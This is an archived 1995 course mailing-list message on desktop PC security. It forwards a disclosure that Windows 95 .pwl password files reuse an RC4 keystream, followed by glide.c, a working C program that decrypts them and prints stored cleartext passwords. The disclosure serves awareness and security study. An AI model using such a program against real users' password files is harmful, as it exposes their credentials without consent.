@@ -1,0 +1,324 @@
+
+<DOC>
+<DOCNO>WT02-B11-114</DOCNO>
+<DOCOLDNO>IA086-000622-B009-309</DOCOLDNO>
+<DOCHDR>
+http://res2.resnet.upenn.edu:80/hypermail/cis899/0148.html 130.91.195.242 19970122041546 text/html 15156
+HTTP/1.0 200 OK
+Date: Wed, 22 Jan 1997 04:15:47 GMT
+Server: Apache/1.1.1
+Content-type: text/html
+Content-length: 14984
+Last-modified: Fri, 08 Dec 1995 16:29:01 GMT
+</DOCHDR>
+<!-- received="Fri Dec  8 03:51:25 1995 EST" -->
+<!-- sent="Fri, 8 Dec 1995 03:50:38 -0500 (EST)" -->
+<!-- name="Meng Weng Wong" -->
+<!-- email="mengwong@icg.resnet.upenn.edu" -->
+<!-- subject="security followup 1" -->
+<!-- id="199512080850.DAA25199@icg.resnet.upenn.edu" -->
+<!-- inreplyto="" -->
+<title>Daily Chat on CIS899: security followup 1</title>
+<h1>security followup 1</h1>
+Meng Weng Wong (<i>mengwong@icg.resnet.upenn.edu</i>)<br>
+<i>Fri, 8 Dec 1995 03:50:38 -0500 (EST)</i>
+<p>
+<ul>
+<li> <b>Messages sorted by:</b> <a href="index.html#148">[ date ]</a><a href="thread.html#148">[ thread ]</a><a href="subject.html#148">[ subject ]</a><a href="author.html#148">[ author ]</a>
+<!-- next="start" -->
+<li> <b>Next message:</b> <a href="0149.html">Michael Nenashev: "Re: security followup 1"</a>
+<li> <b>Previous message:</b> <a href="0147.html">Dave Farber: "reminder -- meng et al tomorrow"</a>
+<!-- nextthread="start" -->
+<li> <b>Next in thread:</b> <a href="0149.html">Michael Nenashev: "Re: security followup 1"</a>
+</ul>
+<!-- body="start" -->
+one point which i didn't have time to bring up in our<br>
+presentation today was this.<br>
+<p>
+the more complex your typical single-user desktop pc gets,<br>
+the less control the user will have over it; and it gets all<br>
+the more likely that there will be security holes in it.<br>
+<p>
+releasing an O/S upgrade is a major effort -- just look at<br>
+all the man-hours invested in windows 95 by customers, by<br>
+microsoft support staff, and by third-party vendors swimming<br>
+along in microsoft's wake like remoras behind a shark :)<br>
+<p>
+tomorrow's computing environment is a networked environment.<br>
+<p>
+and when the user does not have full control over his own<br>
+networked computer, security breaches will happen.<br>
+<p>
+(perhaps it is apocryphal, but i remember a rumour that one<br>
+of the earlier pre-release versions of windows 95 had a bug<br>
+in it -- you send it some kind of TCP sequence, and it dumps<br>
+its hard disk to you.  untrue now, i'm sure, but possible.<br>
+murphy willing, it's just a matter of time before it<br>
+happens.  the names will change, but the story stays the<br>
+same.)<br>
+<p>
+the unix world is accustomed to weekly cert advisories that<br>
+send sysadmins scrambling to patch the latest holes.<br>
+<p>
+cert advisories affecting windows 95, or macOS system 8, or<br>
+any kind of desktop pc in general -- they can't be too far<br>
+away.<br>
+<p>
+today, when your car breaks down, you know you can go to the<br>
+mechanic down the road.  five years from now, when a cert<br>
+advisory comes out and your computer's affected, what do you<br>
+do?  two million people calling 1-800-MICROSOFT?  or will<br>
+every computer sold have a sysadmin policy sold along with<br>
+it?  so that you can call up your local computer service<br>
+center, give them your customer ID, and have them log in as<br>
+root to your box to fix the hole?<br>
+<p>
+not an impossible future -- and one with interesting<br>
+implications for e-commerce.<br>
+<p>
+cheers<br>
+meng<br>
+<p>
+<i> &gt;Date: Mon, 4 Dec 1995 19:06:12 +0100</i><br>
+<i> &gt;From: Tatu Ylonen &lt;ylo@cs.hut.fi&gt;</i><br>
+<i> &gt;</i><br>
+<i> &gt;Basically, you should be aware that if you ever mount disks from Unix</i><br>
+<i> &gt;machines to Windows95 machines, the passwords of the unix machine (or</i><br>
+<i> &gt;your other file servers) will be stored on the Windows machine's disk</i><br>
+<i> &gt;essentially in the plain, and any 10-year computer-literate kid with a</i><br>
+<i> &gt;little knowledge will be able to retrieve them in seconds if he gets</i><br>
+<i> &gt;access to client machine.</i><br>
+<i> &gt;</i><br>
+<i> &gt;The message below explains the details.  Essentially it means that</i><br>
+<i> &gt;the whole encryption scheme used by Microsoft in Windows95 is a Bad</i><br>
+<i> &gt;Joke.  Not only does it use too short keys (breakable by brute force</i><br>
+<i> &gt;in 8 hours on a normal workstation), but additionally it screws up the</i><br>
+<i> &gt;implementation, meaning that your keys can be trivially decrypted</i><br>
+<i> &gt;in a fraction of a second without ever even brute-forcing the key.</i><br>
+<i> &gt;The program to do this is below.</i><br>
+<i> &gt;</i><br>
+<i> &gt;I find this kind of "security" shocking.  I think this should go to</i><br>
+<i> &gt;the mass media.  At least make people at your sites aware of this</i><br>
+<i> &gt;fiasco.</i><br>
+<i> &gt;</i><br>
+<i> &gt;    Tatu</i><br>
+<i> &gt;</i><br>
+<i> &gt;------- start of forwarded message (RFC 934 encapsulation) -------</i><br>
+<i> &gt;From: Frank Andrew Stevenson &lt;frank@funcom.no&gt;</i><br>
+<i> &gt;To: cypherpunks@toad.com</i><br>
+<i> &gt;Subject: Cracked: WINDOWS.PWL</i><br>
+<i> &gt;Date: Mon, 4 Dec 1995 17:51:36 +0100 (MET)</i><br>
+<i> &gt;</i><br>
+<i> &gt;A few days ago Peter Gutmann posted a description on how</i><br>
+<i> &gt;Windows 95 produces RC4 keys of 32 bits size to protect</i><br>
+<i> &gt;the .pwl files. I verified the information and wrote a</i><br>
+<i> &gt;program to decrypt .pwl files with a known password, I then</i><br>
+<i> &gt;discovered that the .pwl files where well suited for a known</i><br>
+<i> &gt;plaintext attack as the 20 first bytes are completely predictable.</i><br>
+<i> &gt;</i><br>
+<i> &gt;The 20 first bytes of any .pwl files contains the username, which</i><br>
+<i> &gt;is the same as the filename, in capitals, padded with 0x00. From then</i><br>
+<i> &gt;I wrote a program to bruteforce the .pwl file and optimized it</i><br>
+<i> &gt;so it would run in less than 24 hours on an SGI. I run a test</i><br>
+<i> &gt;of the bruter software and recovered an unknown rc4 key in 8 hours,</i><br>
+<i> &gt;but the decrypted file was still largely uninteligeble, I then proceeded</i><br>
+<i> &gt;to decrypt the file at all possible starting points, and discovered</i><br>
+<i> &gt;valuable information (cleartext passwords) offset in the file.</i><br>
+<i> &gt;</i><br>
+<i> &gt;This has enormous implications: RC4 is a stream cipher, it</i><br>
+<i> &gt;generates a long pseudo random stream that it uses to XOR the</i><br>
+<i> &gt;data byte by byte. This isn't neccecaraly weak encryption if you</i><br>
+<i> &gt;don't use the same stream twice: however WIN95 does, every resource is</i><br>
+<i> &gt;XORed with the same pseudo random stream. What's more the 20</i><br>
+<i> &gt;first bytes are easy to guess. This is easy to exploit:</i><br>
+<i> &gt;XOR the 20 bytes starting at position 0x208 with the user name</i><br>
+<i> &gt;in uppercase, and slide this string through the rest of the file</i><br>
+<i> &gt;(xoring it with whatever is there) this reveals the 20</i><br>
+<i> &gt;first bytes of the different resources.</i><br>
+<i> &gt;</i><br>
+<i> &gt;&gt;From there I went on to study the structure of the .pwl file it is</i><br>
+<i> &gt;something like this (decrypted):</i><br>
+<i> &gt;</i><br>
+<i> &gt;USERNAME.........wpwpwpwpwpwpwpwpwpwp</i><br>
+<i> &gt;rs???????</i><br>
+<i> &gt;rs</i><br>
+<i> &gt;rs</i><br>
+<i> &gt;rs???????????</i><br>
+<i> &gt;rs???????</i><br>
+<i> &gt;</i><br>
+<i> &gt;where wp is i word pointer to the different resources (from start</i><br>
+<i> &gt;of pwl file) The 2 first bytes of the resource (rs) is its length in bytes</i><br>
+<i> &gt;(of course XOR with RC4 output) It is the fairly easy to find all the</i><br>
+<i> &gt;resource pointers by jumping from start of resource to next resource,</i><br>
+<i> &gt;had it not been for the fact that the size sometimes is incorrect</i><br>
+<i> &gt;(courtesy of M$)</i><br>
+<i> &gt;</i><br>
+<i> &gt;What follows is a short c program that tries to remedy this and</i><br>
+<i> &gt;reconstruct the pointertable thus generating at least 54 bytes of the RC4</i><br>
+<i> &gt;pseudorandom stream, and then proceedes to decrypt as much as possible from</i><br>
+<i> &gt;the different resources.</i><br>
+<i> &gt;</i><br>
+<i> &gt;What does this show? Although RC4 is a fairly strong cipher, it has the</i><br>
+<i> &gt;same limitations as any XOR streamcipher, and implementing it without</i><br>
+<i> &gt;sufficient knowledge can have dire consequences. I strongly suggest that</i><br>
+<i> &gt;the programmers at Microsoft do their homework before trying anything like</i><br>
+<i> &gt;this again!</i><br>
+<i> &gt;</i><br>
+<i> &gt;</i><br>
+<i> &gt;</i><br>
+<i> &gt;DISCLAIMER:</i><br>
+<i> &gt;This is a quick hack, I don't make any claims about usefulness for</i><br>
+<i> &gt;any purpose, nor do I take responsibility for use nor consequences of</i><br>
+<i> &gt;use of the software. FUNCOM of Norway is not responsible for any of this,</i><br>
+<i> &gt;(I speak for myself, and let others speak for themselves)</i><br>
+<i> &gt;</i><br>
+<i> &gt;This source is hereby placed in the public domain, please</i><br>
+<i> &gt;improve if you can.</i><br>
+<i> &gt;</i><br>
+<i> &gt;- --- glide.c ---</i><br>
+<i> &gt;</i><br>
+<i> &gt;#include &lt;stdio.h&gt;</i><br>
+<i> &gt;#include &lt;string.h&gt;</i><br>
+<i> &gt;</i><br>
+<i> &gt;</i><br>
+<i> &gt;unsigned char Data[100001];</i><br>
+<i> &gt;unsigned char keystream[1001];</i><br>
+<i> &gt;int Rpoint[300];</i><br>
+<i> &gt;</i><br>
+<i> &gt;</i><br>
+<i> &gt;main (int argc,char *argv[]) {</i><br>
+<i> &gt;       FILE *fd;</i><br>
+<i> &gt;       int     i,j,k;</i><br>
+<i> &gt;       int     size;</i><br>
+<i> &gt;       char ch;</i><br>
+<i> &gt;       char *name;</i><br>
+<i> &gt;       int cracked;</i><br>
+<i> &gt;       int sizemask;</i><br>
+<i> &gt;       int maxr;</i><br>
+<i> &gt;       int rsz;</i><br>
+<i> &gt;       int pos;</i><br>
+<i> &gt;       int Rall[300]; /* resource allocation table */</i><br>
+<i> &gt;</i><br>
+<i> &gt;</i><br>
+<i> &gt;       if (argc&lt;2) {</i><br>
+<i> &gt;               printf("usage: glide filename (username)");</i><br>
+<i> &gt;               exit(1);</i><br>
+<i> &gt;       }</i><br>
+<i> &gt;</i><br>
+<i> &gt;       /* read PWL file */</i><br>
+<i> &gt;</i><br>
+<i> &gt;       fd=fopen(argv[1],"rb");</i><br>
+<i> &gt;       if(fd==NULL) {</i><br>
+<i> &gt;               printf("can't open file %s",argv[2]);</i><br>
+<i> &gt;               exit(1);</i><br>
+<i> &gt;       }</i><br>
+<i> &gt;       size=0;</i><br>
+<i> &gt;       while(!feof(fd)) {</i><br>
+<i> &gt;               Data[size++]=fgetc(fd);</i><br>
+<i> &gt;       }</i><br>
+<i> &gt;       size--;</i><br>
+<i> &gt;       fclose(fd);</i><br>
+<i> &gt;</i><br>
+<i> &gt;       /* find username */</i><br>
+<i> &gt;       name=argv[1];</i><br>
+<i> &gt;       if(argc&gt;2) name=argv[2];</i><br>
+<i> &gt;       printf("Username: %s\n",name);</i><br>
+<i> &gt;</i><br>
+<i> &gt;       /* copy encrypted text into keystream */</i><br>
+<i> &gt;       cracked=size-0x0208;</i><br>
+<i> &gt;       if(cracked&lt;0) cracked=0;</i><br>
+<i> &gt;       if(cracked&gt;1000) cracked=1000;</i><br>
+<i> &gt;       memcpy(keystream,Data+0x208,cracked );</i><br>
+<i> &gt;</i><br>
+<i> &gt;       /* generate 20 bytes of keystream */</i><br>
+<i> &gt;       for(i=0;i&lt;20;i++) {</i><br>
+<i> &gt;               ch=toupper(name[i]);</i><br>
+<i> &gt;               if(ch==0) break;</i><br>
+<i> &gt;               if(ch=='.') break;</i><br>
+<i> &gt;               keystream[i]^=ch;</i><br>
+<i> &gt;       };</i><br>
+<i> &gt;       cracked=20;</i><br>
+<i> &gt;</i><br>
+<i> &gt;</i><br>
+<i> &gt;       /* find allocated resources */</i><br>
+<i> &gt;</i><br>
+<i> &gt;       sizemask=keystream[0]+(keystream[1]&lt;&lt;8);</i><br>
+<i> &gt;       printf("Sizemask: %04X\n",sizemask);</i><br>
+<i> &gt;</i><br>
+<i> &gt;       for(i=0;i&lt;256;i++) Rall[i]=0;</i><br>
+<i> &gt;</i><br>
+<i> &gt;       maxr=0;</i><br>
+<i> &gt;       for(i=0x108;i&lt;0x208;i++) {</i><br>
+<i> &gt;               if(Data[i]!=0xff) {</i><br>
+<i> &gt;                       Rall[Data[i]]++;</i><br>
+<i> &gt;                       if (Data[i]&gt;maxr) maxr=Data[i];</i><br>
+<i> &gt;               }</i><br>
+<i> &gt;       }</i><br>
+<i> &gt;       maxr=(((maxr/16)+1)*16);        /* resource pointer table size</i><br>
+<i> &gt;appears to be</i><br>
+ divisible by 16 */<br>
+<i> &gt;</i><br>
+<i> &gt;       /* search after resources */</i><br>
+<i> &gt;</i><br>
+<i> &gt;       Rpoint[0]=0x0208+2*maxr+20+2;   /* first resource */</i><br>
+<i> &gt;       for(i=0;i&lt;maxr;i++) {</i><br>
+<i> &gt;               /* find size of current resource */</i><br>
+<i> &gt;               pos=Rpoint[i];</i><br>
+<i> &gt;               rsz=Data[pos]+(Data[pos+1]&lt;&lt;8);</i><br>
+<i> &gt;               rsz^=sizemask;</i><br>
+<i> &gt;               printf("Analyzing block with size:</i><br>
+<i> &gt;%04x\t(%d:%d)\n",rsz,i,Rall[i]);</i><br>
+<i> &gt;               if( (Rall[i]==0) &amp;&amp; (rsz!=0) ) {</i><br>
+<i> &gt;                       printf("unused resource has nonzero size !!!\n");</i><br>
+<i> &gt;                       exit(0);</i><br>
+<i> &gt;               }</i><br>
+<i> &gt;</i><br>
+<i> &gt;               pos+=rsz;</i><br>
+<i> &gt;</i><br>
+<i> &gt;               /* Resources have a tendency to have the wrong size for</i><br>
+<i> &gt;some reason */</i><br>
+<i> &gt;               /* check for correct size */</i><br>
+<i> &gt;</i><br>
+<i> &gt;               if(i&lt;maxr-1) {</i><br>
+<i> &gt;                       while(Data[pos+3]!=keystream[1]) {</i><br>
+<i> &gt;                               printf(":(%02x)",Data[pos+3]);</i><br>
+<i> &gt;                               pos+=2; /* very rude may fail */</i><br>
+<i> &gt;                       }</i><br>
+<i> &gt;               }</i><br>
+<i> &gt;</i><br>
+<i> &gt;               pos+=2; /* include pointer in size */</i><br>
+<i> &gt;               Rpoint[i+1]=pos;</i><br>
+<i> &gt;       }</i><br>
+<i> &gt;       Rpoint[maxr]=size;</i><br>
+<i> &gt;</i><br>
+<i> &gt;       /* insert Table data into keystream */</i><br>
+<i> &gt;       for(i=0;i &lt;= maxr;i++) {</i><br>
+<i> &gt;               keystream[20+2*i]^=Rpoint[i] &amp; 0x00ff;</i><br>
+<i> &gt;               keystream[21+2*i]^=(Rpoint[i] &gt;&gt; 8) &amp; 0x00ff;</i><br>
+<i> &gt;       }</i><br>
+<i> &gt;       cracked+=maxr*2+2;</i><br>
+<i> &gt;</i><br>
+<i> &gt;       printf("%d bytes of keystream recovered\n",cracked);</i><br>
+<i> &gt;</i><br>
+<i> &gt;       /* decrypt resources */</i><br>
+<i> &gt;       for(i=0;i &lt; maxr;i++) {</i><br>
+<i> &gt;               rsz=Rpoint[i+1]-Rpoint[i];</i><br>
+<i> &gt;               if (rsz&gt;cracked) rsz=cracked;</i><br>
+<i> &gt;               printf("Resource[%d] (%d)\n",i,rsz);</i><br>
+<i> &gt;               for(j=0;j&lt;rsz;j++) printf("%c",Data[Rpoint[i]+j]^keystream[j]);</i><br>
+<i> &gt;               printf("\n");</i><br>
+<i> &gt;       }</i><br>
+<i> &gt;</i><br>
+<i> &gt;</i><br>
+<i> &gt;       exit(0);</i><br>
+<i> &gt;}</i><br>
+<!-- body="end" -->
+<p>
+<ul>
+<!-- next="start" -->
+<li> <b>Next message:</b> <a href="0149.html">Michael Nenashev: "Re: security followup 1"</a>
+<li> <b>Previous message:</b> <a href="0147.html">Dave Farber: "reminder -- meng et al tomorrow"</a>
+<!-- nextthread="start" -->
+<li> <b>Next in thread:</b> <a href="0149.html">Michael Nenashev: "Re: security followup 1"</a>
+</ul>
+</DOC>
